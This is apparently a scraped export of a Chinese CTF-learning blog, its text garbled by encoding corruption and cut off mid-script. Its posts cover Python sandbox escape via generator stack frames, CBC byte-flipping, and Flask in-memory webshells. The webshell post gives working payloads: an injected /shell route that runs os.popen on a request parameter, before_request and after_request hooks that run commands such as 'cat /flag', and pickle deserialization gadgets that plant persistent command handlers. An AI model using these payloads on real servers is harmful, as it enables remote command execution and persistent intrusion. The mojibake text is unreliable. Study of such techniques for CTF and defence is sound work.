D:\\\\pycharm\\\\PythonProject\\\\12121212.py, line 1, code my_generatorCode Object: code object my_generator at 0x0000024A349F1200, file D:\\pycharm\\PythonProject\\12121212.py, line 1Instruction Pointer: 0 åˆ©ç”¨æ ˆå¸§é€ƒé€¸æ²™ç®±æ ˆå¸§ï¼ˆstack frameï¼‰æ˜¯å‡½æ•°è°ƒç”¨æ—¶ç”¨æ¥å­˜å‚¨å±€éƒ¨å˜é‡ã€è¿”å›åœ°å€ç­‰çš„ä¸€æ®µå†…å­˜ç©ºé—´ã€‚å¦‚æœä½ èƒ½â€œé€ƒé€¸â€å‡ºè¿™ä¸ªæ ˆå¸§çš„æ§åˆ¶èŒƒå›´ï¼Œä½ å°±èƒ½è®¿é—®ä¿®æ”¹ä¸è¯¥è®¿é—®çš„å†…å­˜ï¼ˆæ¯”å¦‚æ²™ç®±å¤–çš„æ•°æ®æˆ–æŒ‡ä»¤ï¼‰ï¼Œè¿™å°±å«æ ˆå¸§é€ƒé€¸ åŸç†æ˜¯ï¼šæ˜¯é€šè¿‡ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡f_backï¼ˆè¿”å›å‰ä¸€å¸§ï¼‰ä»è€Œé€ƒé€¸å‡ºå»è·å–globalsç¬¦å·è¡¨ï¼Œä¾‹å¦‚ï¼š frame0 (f å†…éƒ¨) â€“ frame1 (waff å‡½æ•°) â€“ frame2 (exec æ‰€åœ¨ä½œç”¨åŸŸ) ä¸‹é¢è„šæœ¬å°±æ˜¯é€šè¿‡æ ˆå¸§ä¸€æ­¥ä¸€æ­¥æ‹¿åˆ°å…¨å±€å˜é‡s3cretä½†æ˜¯ä¸ç›´æ¥å¼•ç”¨ s3cret=this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ print(frame) print(frame.f_back) print(frame.f_back.f_back) b = frame.f_back.f_back.f_globals[s3cret] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return bb=waff()locals=code = compile(codes, test, exec)exec(code,locals)print(locals[b]) è¿‡æ»¤ç»•è¿‡list send ç”Ÿæˆå™¨è¡¨è¾¾å¼ç»•è¿‡ yieldè¿‡æ»¤ä¹Ÿå¯ä»¥ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ globalsä¸­çš„__builtins__å­—æ®µä»£ç è¿™ä¹ˆè®¾è®¡ key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ b = frame.f_back.f_back.f_globals[key] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) è¿™é‡Œå°†æ²™ç®±ä¸­çš„__builtins__ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´æ²™ç®±ä¸­ä¸èƒ½è°ƒç”¨å†…ç½®æ–¹æ³•äº†ï¼Œé‚£æˆ‘ä»¬è¿™æ®µä»£ç è¿è¡Œå°±ä¼šæŠ¥é”™äº†(nextæ–¹æ³•ä¸èƒ½ä½¿ç”¨)ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•ä»£æ›¿nextæ–¹æ³•æ¥æ‹¿åˆ°ç”Ÿæˆå™¨çš„å€¼ï¼Œè¿˜è®°å¾—ä¸Šé¢è¯´å¯ä»¥éå†çš„å½¢å¼æ¥è·å–ç”Ÿæˆå™¨çš„å€¼ï¼š key = this is flagcodes=def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = [i for i in g][0] #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ b = frame.f_back.f_back.f_back.f_globals[key] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return bb=waff()locals=__builtins__: Nonecode = compile(codes, , exec)exec(code, locals, None)print(locals[b]) â€‹","tags":["CTFå­¦ä¹ "]},{"title":"CBCå­—èŠ‚ç¿»è½¬æ”»å‡»","path":"/2025/04/27/CBCå­—èŠ‚ç¿»è½¬æ”»å‡»/","content":"CBCåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹ åŠ å¯†è¿‡ç¨‹CBCåŠ å¯†æµç¨‹ï¼š å‡†å¤‡ å°†æ˜æ–‡æŒ‰å›ºå®šé•¿åº¦ï¼ˆé€šå¸¸æ˜¯å—å¤§å°ï¼Œæ¯”å¦‚AESæ˜¯128ä½ï¼‰åˆ†å—ã€‚ å¦‚æœæœ€åä¸€å—ä¸è¶³é•¿åº¦ï¼Œéœ€è¦å¡«å……ï¼ˆpaddingï¼‰ã€‚ é€‰ä¸€ä¸ªåˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ï¼Œå®ƒçš„é•¿åº¦è·Ÿåˆ†å—å¤§å°ç›¸åŒã€‚ åŠ å¯†æ¯ä¸€å—ï¼ˆç¬¬ i å—ï¼‰ ç¬¬1æ­¥ï¼šç”¨å½“å‰æ˜æ–‡å— PiP_iPi å’Œå‰ä¸€å—å¯†æ–‡ï¼ˆæˆ–IVï¼‰åšå¼‚æˆ–ï¼ˆXORï¼‰ã€‚ ç¬¬ä¸€ä¸ªå—æ˜¯$$C_0Ek(P0âŠ•IV)$$ ç¬¬2æ­¥ï¼šå°†å¼‚æˆ–åçš„ç»“æœé€å…¥åŠ å¯†ç®—æ³•ï¼ˆE_kï¼‰ï¼ˆæ¯”å¦‚AESï¼‰åŠ å¯†ï¼Œå¾—åˆ°å½“å‰å—çš„å¯†æ–‡ Ciã€‚ ç¬¬3æ­¥ï¼šå½“å‰çš„å¯†æ–‡å— CiC_iCi ä¼šä½œä¸ºä¸‹ä¸€å—æ˜æ–‡çš„XORå¯¹è±¡ã€‚ å¾ªç¯å¤„ç†æ¯ä¸€å—ï¼Œç›´åˆ°å…¨éƒ¨åŠ å¯†å®Œæˆã€‚ è§£å¯†è¿‡ç¨‹è§£å¯†è¿‡ç¨‹åˆšå¥½ç›¸åï¼Œç¬¬ä¸€ç»„å¯†æ–‡åœ¨è§£å¯†ä¹‹åä¸åˆå§‹å‘é‡IVå¼‚æˆ–å¾—åˆ°ç¬¬ä¸€ç»„æ˜æ–‡ã€‚ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ä¹‹åå’Œç¬¬ä¸€ç»„å¯†æ–‡å¼‚æˆ–å¾—åˆ°ç¬¬äºŒç»„æ˜æ–‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè§£å¯†ä¸€ç»„æ˜æ–‡éœ€è¦æœ¬ç»„å’Œå‰ä¸€ç»„çš„å¯†æ–‡ã€‚ ç‰¹ç‚¹åŠ å¯†ç®—æ³•çš„è¾“å…¥æ˜¯ä¸Šä¸€ä¸ªå¯†æ–‡åˆ†ç»„å’Œä¸‹ä¸€ä¸ªæ˜æ–‡åˆ†ç»„çš„å¼‚æˆ– EXBæ¨¡å¼å’ŒCBCæ¨¡å¼ CBCå­—èŠ‚ç¿»è½¬æ”»å‡»CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„æ ¸å¿ƒåŸç†æ˜¯é€šè¿‡ç ´åä¸€ä¸ªæ¯”ç‰¹çš„å¯†æ–‡æ¥ç¯¡æ”¹ä¸€ä¸ªæ¯”ç‰¹çš„æ˜æ–‡ã€‚ $$ç”±é¢˜ç›®å¾— AâŠ•BC$$å¦‚æœæˆ‘ä»¬æƒ³è¦æ”¹å˜è¾“å‡ºçš„æ˜æ–‡C é‚£æˆ‘ä»¬åªéœ€è¦æ”¹å˜ç§˜é’¥A ä»¤æ”¹å˜åçš„Aä¸ºAâ€™ Cä¸ºCâ€™ï¼Œäºæ˜¯ï¼š C=CâŠ•CâŠ•C =AâŠ•BâŠ•CâŠ•C =BâŠ•AâŠ•CâŠ•Cä»¤A=AâŠ•CâŠ•C--C=BâŠ•A--AâŠ•B=C ç¿»è½¬æˆåŠŸå•¦ï¼ æ‰€ä»¥æŠŠAæ”¹ä¸ºAâ€™AâŠ•CâŠ•Câ€™ æˆ‘ä»¬å°±å¯ä»¥å®ç°è¿™ä¸ªå­—èŠ‚ç¿»è½¬æ”»å‡» æµ‹è¯•æ”»å‡»æ¨¡æ‹Ÿä»£ç from Crypto.Cipher import AESimport uuidimport binasciiBS = AES.block_size # åˆ†ç»„é•¿åº¦key = btest # å¯†é’¥iv = uuid.uuid4().bytes # éšæœºåˆå§‹å‘é‡pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() # Pkcs5Paddingdata = b1234567890abcdefabcdef1234567890 # æ˜æ–‡M# åŠ å¯†def enc(data): aes = AES.new(pad(key), AES.MODE_CBC, iv) ciphertext = aes.encrypt(pad(data)) ciphertext = binascii.b2a_hex(ciphertext) return ciphertext# è§£å¯†def dec(c): c = binascii.a2b_hex(c) aes = AES.new(pad(key), AES.MODE_CBC, iv) data = aes.decrypt(c) return data# æµ‹è¯•CBCç¿»è½¬def CBC_test(c): c = bytearray(binascii.a2b_hex(c)) c[0] = c[0] ^ ord(a) ^ ord(A) # c[0]ä¸ºç¬¬ä¸€ç»„çš„å¯†æ–‡å­—ç¬¦ï¼Œaä¸ºç¬¬äºŒç»„ç›¸åº”ä½ç½®çš„æ˜æ–‡å­—ç¬¦ï¼ŒAæ˜¯æˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡å­—ç¬¦ è¿™ä¸€æ­¥å°±æ˜¯åœ¨åš A=AâŠ•CâŠ•C c = binascii.b2a_hex(c) return cprint(ciphertext:, enc(data))print(data:, dec(enc(data)))print(CBC Attack:, dec(CBC_test(enc(data)))) è¾“å‡ºç»“æœ ciphertext: b65518dfe77f7d677134f341c5b00c1674e7a87b231f852b63d35ee69dc60bcc7c5b7325b590c00d089b6ad312f21b043data: b1234567890abcdefabcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10CBC Attack: b\\xfe\\xb4\\x11n+\\x1a\\xb7\\x90\\x9c\\x86TPvS\\xd4\\x9cAbcdef1234567890\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10 å¯ä»¥çœ‹åˆ°ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ä¹‹åå·²ç»è¢«æˆ‘ä»¬æ›´æ”¹æˆäº†Aï¼Œè€Œç”±äºæˆ‘ä»¬æ›´æ”¹äº†ç¬¬ä¸€ç»„çš„å¯†æ–‡ï¼Œæ‰€ä»¥ç¬¬ä¸€ç»„è§£å¯†çš„æ˜æ–‡å˜æˆäº†ä¹±ç ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦æ›´æ”¹ç¬¬ä¸€ç»„çš„æ˜æ–‡ï¼Œåˆ™éœ€è¦ä¿®æ”¹åˆå§‹å‘é‡IVçš„å€¼ã€‚ äºæ˜¯è¾¾åˆ°ä¿®æ”¹æ˜æ–‡çš„å†…å®¹çš„ç›®çš„ï¼šè§£å¯†å‡ºæ¥çš„å†…å®¹å°±ä¼šæŠŠ a æ”¹æˆ A ä¾‹é¢˜bugku-login4é¢˜è§£é“¾æ¥ï¼šhttps://cltheorem.github.io/2019/03/bugku-login/ æ€»ç»“é€šè¿‡CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œå‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿè§¦å‘åŠ è§£å¯†è¿‡ç¨‹ï¼Œå¹¶ä¸”èƒ½å¤Ÿè·å¾—æ¯æ¬¡åŠ å¯†åçš„å¯†æ–‡ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ä¸çŸ¥é“keyçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¿®æ”¹å¯†æ–‡æˆ–IVï¼Œæ¥æ§åˆ¶è¾“å‡ºæ˜æ–‡ä¸ºè‡ªå·±æƒ³è¦çš„å†…å®¹ï¼Œè€Œä¸”åªèƒ½ä»æœ€åä¸€ç»„å¼€å§‹ä¿®æ”¹ï¼Œå¹¶ä¸”æ¯æ”¹å®Œä¸€ç»„ï¼Œéƒ½éœ€è¦é‡æ–°è·å–ä¸€æ¬¡è§£å¯†åçš„æ•°æ®ï¼Œè¦æ ¹æ®è§£å¯†åçš„æ•°æ®æ¥ä¿®æ”¹å‰ä¸€ç»„å¯†æ–‡çš„å€¼ã€‚ å‚è€ƒæ–‡ç« https://blog.csdn.net/XL115715453/article/details/102442024?spm=1001.2014.3001.5506 https://goodapple.top/archives/217 https://blog.csdn.net/XiongSiqi_blog/article/details/131925246","tags":["CTFå­¦ä¹ "]},{"title":"æµ…è°ˆpythonå†…å­˜é©¬","path":"/2025/04/20/pythonå†…å­˜é©¬å­¦ä¹ /","content":"å‰è¨€ï¼šæƒ³æ³•æ¥æºäºTGCTFçš„ä¸€é“é¢˜ æƒ³å…·ä½“å­¦ä¹ ä¸‹ å†…å­˜é©¬ç©¶ç«Ÿæ˜¯ä»€ä¹ˆä¸œè¥¿ Pythonå†…å­˜é©¬ä¼—æ‰€å‘¨çŸ¥ï¼Œpythonä¸‹æœ‰è®¸å¤šè½»å‹æ¡†æ¶ï¼Œæ¯”å¦‚ flask Tornado pyramidç­‰ æ¯ä¸ªæ¡†æ¶éƒ½åŸºæœ¬æœ‰å…¶å¯¹åº”çš„å†…å­˜é©¬æ³¨å…¥çš„æ–¹å¼ Flaskå†…å­˜é©¬æ³¨å…¥flaskæ¡†æ¶ä¸­ä½¿ç”¨ render_template_string() è¿›è¡Œæ¸²æŸ“ï¼Œä½†æœªå¯¹ç”¨æˆ·ä¼ è¾“çš„ä»£ç è¿›è¡Œè¿‡æ»¤å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„ä»£ç æ¥å®ç° python å†…å­˜é©¬çš„æ³¨å…¥ã€‚ è€ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥å¤šå­˜åœ¨sstiçš„åœºæ™¯ä¸­ å¦‚æœæƒ³è¦åœ¨pythonä¸­å®ç°å†…å­˜é©¬ å¿…é¡»æƒ³æ˜¯å¦èƒ½åŠ¨æ€æ³¨å†Œæ–°è·¯ç”± flaskæ³¨å†Œæ–°è·¯ç”±ç”¨çš„æ˜¯ app.route å®é™…è°ƒç”¨çš„æ˜¯add_url_ruel æ³¨æ„ï¼šä»ä¸‹é¢ä¸€ç›´åˆ°æ„é€ webshell éƒ½æ˜¯å‰è¨€çŸ¥è¯† ä¸ºäº†è®©ä½ æ›´å¥½ç†è§£ å†…å­˜é©¬çš„payloadadd_url_ruelä»‹ç»app.add_url_rule(/index/,endpoint=index,view_func=index) ä¸‰ä¸ªå‚æ•°ï¼š url:å¿…é¡»ä»¥å¼€å¤´ endpointï¼š(ç«™ç‚¹) view_funcï¼šæ–¹æ³• åªéœ€è¦å†™æ–¹æ³•åä¹Ÿå¯ä»¥ä¸ºåŒ¿åå‚æ•°ï¼‰ï¼Œå¦‚æœä½¿ç”¨æ–¹æ³•åä¸è¦åŠ æ‹¬å·ï¼ŒåŠ æ‹¬å·è¡¨ç¤ºå°†å‡½æ•°çš„è¿”å›å€¼ä¼ ç»™äº†view_funcå‚æ•°äº†ï¼Œç¨‹åºå°±ä¼šç›´æ¥æŠ¥é”™ã€‚ åŸç†é¦–å…ˆæ˜¯è¦æ·»åŠ è·¯ç”±æˆåŠŸï¼Œç„¶åç‰¹åˆ«é‡è¦çš„æ˜¯ view_funcä¸­é‡‡ç”¨åŒ¿åå‡½æ•°çš„æ–¹å¼ã€‚è¯¥å‡½æ•°è¦å®ç°æ•è·å€¼ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œå“åº”ã€‚ å½“ä¸€ä¸ªç½‘é¡µè¯·æ±‚åï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextã€‚åœ¨pythonä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡ï¼Œè¯·æ±‚ä¸Šä¸‹æ–‡(request context)å’Œåº”ç”¨ä¸Šä¸‹æ–‡(session context)ã€‚ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯ã€‚è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ªStackçš„æ ˆç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§ã€‚request contextå®ä¾‹åŒ–åï¼Œå®ƒä¼šè¢«pushåˆ°æ ˆ_request_ctx_stackä¸­ï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚ã€‚ Request=_request_ctx_stac.top lambadaè¡¨è¾¾å¼é“¾æ¥:https://www.runoob.com/python3/python-lambda.html Flaskä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶åœ¨ä½¿ç”¨ Flask æ¡†æ¶å®ç°åŠŸèƒ½æ¥å£çš„æ—¶å€™ï¼Œå‰ç«¯ç‚¹å‡»æŒ‰é’®å‘é€è¯·æ±‚çš„è¯·æ±‚æ–¹å¼å’Œ form è¡¨å•æäº¤ç»™åç«¯çš„æ•°æ®ï¼Œåç«¯éƒ½æ˜¯é€šè¿‡ Flask ä¸­çš„ request å¯¹è±¡æ¥è·å–çš„ã€‚åœ¨ Flask æ¡†æ¶ä¸­ï¼Œè¿™ç§ä¼ é€’æ•°æ®çš„æ–¹å¼è¢«ç§°ä¸ºä¸Šä¸‹æ–‡ç®¡ç†ï¼Œåœ¨ Flask æ¡†æ¶ä¸­æœ‰å››ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å¯¹è±¡ï¼šrequest ,session,current_app å’Œ g å˜é‡ã€‚å…¶ä¸­request å’Œ session è¢«ç§°ä¸ºè¯·æ±‚ä¸Šä¸‹æ–‡,current_app å’Œ g å˜é‡è¢«ç§°ä¸ºåº”ç”¨ä¸Šä¸‹æ–‡ã€‚ å…¶å®ä¸€å¥è¯ç†è§£å°±æ˜¯ï¼šFlask çš„ä¸Šä¸‹æ–‡æœºåˆ¶æ˜¯ä¸ºäº†è§£å†³â€œè¯·æ±‚ä¸­ç›¸å…³çš„æ•°æ®éœ€è¦åœ¨å¤šä¸ªå‡½æ•°ä¸­ä½¿ç”¨ï¼Œä½†åˆä¸æƒ³æ‰‹åŠ¨å±‚å±‚ä¼ å‚â€çš„é—®é¢˜ã€‚ è¯·æ±‚ä¸Šä¸‹æ–‡ (request context)Flaskä¸Šä¸‹æ–‡å¯¹è±¡ç›¸å½“äºä¸€ä¸ªå®¹å™¨ã€‚ä¿å­˜äº†Flaskç¨‹åºè¿è¡Œè¿‡ç¨‹çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹å¼å’Œè¡¨å•æ•°æ®ã€‚ 1.request åœ¨ Flask ä¸­ï¼Œrequest å¯¹è±¡å°è£…äº† HTTP è¯·æ±‚çš„å†…å®¹ï¼Œé’ˆå¯¹çš„æ˜¯ HTTP è¯·æ±‚ï¼Œä¿å­˜äº†å½“å‰è¯·æ±‚çš„ç›¸å…³æ•°æ®ã€‚ 2.session sessionå’Œcookieéƒ½æ˜¯ç”¨æ¥åšçŠ¶æ€ä¿æŒ ä½†æ˜¯cookieä¾èµ–äºæµè§ˆå™¨ï¼Œä½†æ˜¯sessionä¸éœ€è¦ã€‚ åº”ç”¨ä¸Šä¸‹æ–‡ (application context)åº”ç”¨ä¸Šä¸‹æ–‡ä¸æ˜¯ä¸€ç›´å­˜åœ¨çš„ï¼Œä»–æ˜¯ä¸´æ—¶çš„ï¼Œå‘é€è¯·æ±‚æ‰ä¼šæœ‰åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œè¯·æ±‚ç»“æŸåå°±ä¼šå¤±æ•ˆã€‚ 1.curent_app current_app æ˜¯åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ï¼Œç”¨äºå­˜å‚¨ Flask åº”ç”¨ç¨‹åº app ä¸­çš„å˜é‡ï¼Œå¯ä»¥åœ¨ current_app ä¸­å­˜å‚¨ä¸€äº›å˜é‡ã€‚ 2.gå˜é‡ g æ˜¯ AppContext ä¸­çš„ä¸´æ—¶å…¨å±€å˜é‡ï¼Œæ¯ä¸ªè¯·æ±‚ç‹¬ç«‹ï¼Œé€‚åˆç”¨äºå­˜å‚¨æ•°æ®åº“è¿æ¥ã€ç¼“å­˜ç­‰ä¸­é—´ä»¶èµ„æºã€‚ä¼šéšç€è¯·æ±‚çš„ç»“æŸè€Œé”€æ¯ã€‚ æ ¸å¿ƒä¸¤ä¸ªæ ˆ ç±»å‹ åç§° å­˜ä»€ä¹ˆ è¯·æ±‚ä¸Šä¸‹æ–‡æ ˆ _request_ctx_stack åŒ…å« request, session, g ç­‰ åº”ç”¨ä¸Šä¸‹æ–‡æ ˆ _app_ctx_stack åŒ…å« current_app, g evalç”¨æ³•eval(expression, globalsNone, localsNone)expression(å¿…éœ€):pythonè¡¨è¾¾å¼ æ‰§è¡Œå¹¶è®¿é—®æ‰§è¡Œçš„ç»“æœ globals(å¯é€‰):è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå®ƒæä¾›äº†æ‰§è¡Œè¡¨è¾¾å¼æ—¶å¯ç”¨çš„å…¨å±€å˜é‡ã€‚å¦‚æœæ²¡æœ‰æä¾›ï¼Œeval() é»˜è®¤ä½¿ç”¨è°ƒç”¨æ—¶çš„å…¨å±€ä½œç”¨åŸŸï¼ˆå³å½“å‰ç¯å¢ƒä¸­çš„å…¨å±€å˜é‡ï¼‰ locals(å¯é€‰):è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºæ‰§è¡Œè¡¨è¾¾å¼æ—¶å¯ç”¨çš„å±€éƒ¨å˜é‡ã€‚å¦‚æœæ²¡æœ‰æä¾›ï¼Œeval() é»˜è®¤ä½¿ç”¨å½“å‰ä½œç”¨åŸŸä¸­çš„å±€éƒ¨å˜é‡ã€‚ å†…å­˜é©¬å†™æ³•url_for.__globals__[__builtins__][eval](\tapp.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read()\t), _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] url_for[__globals__][__builtins__][eval](__import__(sys).modules[__main__].__dict__[app].before_request_funcs.setdefault(None,[]).append(lambda :__import__(os).popen(cat /flag).read())) (1)url_for.__globals__[__builtins__] Python ä¸­å†…ç½®çš„å…¨å±€å‡½æ•°å’Œå¯¹è±¡ï¼ŒåŒ…æ‹¬ print()ã€eval() ç­‰ã€‚é€šè¿‡è¿™ä¸€æ­¥ï¼Œä½ å¯ä»¥è®¿é—®å†…ç½®çš„ eval() å‡½æ•° (2)( app.add_url_rule( /shell, shell, lambda :__import__(os).popen(_request_ctx_stack.top.request.args.get(cmd, whoami)).read() ) åˆ›å»ºä¸€ä¸ªæ–°è·¯ç”± shell åœ¨è¿™ä¸ªshell è·å–è¯·æ±‚ä¸­çš„cmdå‚æ•° å¦‚æœæ²¡æœ‰æä¾›cmdå‚æ•° å°±é»˜è®¤æ‰§è¡Œwhoamiå‘½ä»¤ (3) _request_ctx_stack:url_for.__globals__[_request_ctx_stack], app:url_for.__globals__[current_app] è¿™æ˜¯evalçš„å‡½æ•°ç¬¬äºŒä¸ªå‚æ•° å…¶å®å°±æ˜¯å­—å…¸ å…è®¸åœ¨æ‰§è¡Œè¡¨è¾¾å¼æ—¶ä½¿ç”¨ Flask ç‰¹æœ‰çš„å˜é‡å’Œå¯¹è±¡ Flask çš„ä¸Šä¸‹æ–‡ç®¡ç†ä½¿ç”¨äº†æ ˆç»“æ„ï¼Œé€šè¿‡å°† _request_ctx_stack å’Œ app æ”¾åˆ°ä¸Šä¸‹æ–‡å­—å…¸ä¸­ï¼Œeval() å°±å¯ä»¥è®¿é—®åˆ°å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡å’Œåº”ç”¨å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„ä»£ç ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æœºåˆ¶æ‰§è¡Œæ¶æ„çš„æ“ä½œï¼ˆæ¯”å¦‚æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤ï¼‰ã€‚ æ–°ç‰ˆflaskå†…å­˜é©¬æ³¨å…¥æ–°ç‰ˆå·²ç»ä¸æ”¯æŒé€šè¿‡add_url_ruleæ·»åŠ è·¯ç”±äº†ï¼Œæ‰€ä»¥è¦è€ƒè™‘ç”¨å…¶ä»–çš„æ–¹æ³•æ¥ä»£æ›¿add_url_rule ä½¿ç”¨@app.before_requestå’Œ @app.before_requeståœ¨response(å“åº”)ä¹‹å‰åšå“åº” from flask import Flaskfrom flask import requestfrom flask import redirectfrom flask import session app = Flask(__name__) # type:Flaskapp.secret_key = DragonFire @app.before_requestdef is_login(): if request.path == /login: return None if not session.get(user): return redirect(/login) @app.route(/login)def login(): return Login @app.route(/index)def index(): return Index @app.route(/home)def home(): return Login app.run(0.0.0.0, 5000) æŸ¥çœ‹è¿™ä¸ªå®šä¹‰ å‘ç° self.before_request_funcs.setdefault(None, []).append(f) æ„æ€ï¼šå°†å‡½æ•° f æ³¨å†Œä¸ºå…¨å±€çš„ before_request é’©å­ï¼Œåœ¨æ¯æ¬¡è¯·æ±‚å¤„ç†å‰è‡ªåŠ¨è°ƒç”¨ã€‚ [é’©å­å‡½æ•°æ˜¯ä¸€ç§â€œæ’å…¥ç‚¹â€ï¼Œè®©ä½ åœ¨ç¨‹åºçš„æŸäº›å…³é”®æ—¶åˆ»æ‰§è¡Œè‡ªå®šä¹‰é€»è¾‘] æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªlambadaå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼lambda :__import__(os).popen(whoami).read() æ„é€ poc:eval(__import__(sys).modules[__main__].__dict__[app].before_request_funcs.setdefault(None,[]).append(lambda :__import__(os).popen(dir).read())) ï¼ï¼ï¼ï¼è¿™æ ·åœ¨æ¯æ¬¡responseä¹‹å‰éƒ½ä¼šæ‰§è¡Œlambadaå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤~~~ å°è¯•æœ¬åœ°èµ·æœåŠ¡ from flask import Flask, request, Responseapp = Flask(__name__)@app.route(/)def index(): return Home Page@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: # ä½¿ç”¨ eval åŠ¨æ€æ³¨å…¥ä»£ç  eval(cmd) return Payload injected successfully except Exception as e: return fError: e@app.before_requestdef trigger_hook(): pass # æ‰€æœ‰æ³¨å…¥çš„ before_request éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œif __name__ == __main__: app.run(debug=True) éšæ„è®¿é—®ä¸€ä¸ªç›®å½• å¾—åˆ° æ‰§è¡Œå‘½ä»¤æˆåŠŸå•¦ï¼å–œï¼ @app.after_requeståœ¨response(å“åº”)ä¹‹ååšå‡ºå“åº” @app.after_requestdef foot_log(environ): if request.path != /login: print(æœ‰å®¢äººè®¿é—®äº†,request.path) return environ è¿™é‡Œä¹Ÿæ˜¯å’Œå‰é¢çš„å·®ä¸å¤š ä½†æ˜¯è¦å®šä¹‰ä¸€ä¸ªè¿”å›å€¼ ä¸ç„¶ä¼šæŠ¥é”™ eval(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(cmd) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\cmd\\)).read())\\)==None else resp)) from flask import Flask, request, make_responseapp = Flask(__name__)# æ³¨å…¥ç‚¹ï¼šå¯åŠ¨æ€æ³¨å…¥ payload@app.route(/e)def inject_memory_shell(): cmd = request.args.get(cmd) try: eval(cmd) return Payload injected successfully except Exception as e: return fError: e# åˆå§‹é’©å­ï¼šå ä½@app.after_requestdef default_after(resp): return resp# ä¸»é¡µé¢@app.route(/)def index(): return Home Pageif __name__ == __main__: app.run(debug=True) bingo!æˆåŠŸ pickleä¸‹åˆ©ç”¨çš„poc import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(\\sys\\).modules[__main__].__dict__[app].before_request_funcs.setdefault(None, []).append(lambda :__import__(os).popen(request.args.get(gxngxngxn)).read()),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (eval,(__import__(sys).modules[__main__].__dict__[app].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(gxngxngxn) and exec(\\global CmdResp;CmdResp=__import__(\\flask\\).make_response(__import__(\\os\\).popen(request.args.get(\\gxngxngxn\\)).read())\\)==None else resp),))a = A()b = pickle.dumps(a)print(base64.b64encode(b)) import osimport pickleimport base64class A(): def __reduce__(self): return (exec,(global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(os).popen(request.args.get(gxngxngxn)).read(),))a = A()b = 